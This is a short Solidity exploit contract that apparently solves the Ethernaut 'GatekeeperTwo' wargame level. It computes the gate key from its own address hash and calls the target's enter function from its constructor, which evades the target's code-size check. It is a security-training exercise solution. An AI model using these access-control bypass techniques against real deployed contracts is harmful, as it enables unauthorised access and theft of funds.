contract GatekeeperTwoAttack {
    GatekeeperTwo target;
    
    constructor(address _target) public {
        target = GatekeeperTwo(_target);
        bytes8 val = bytes8((uint64(0)-1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        
        target.enter(val);
    }
}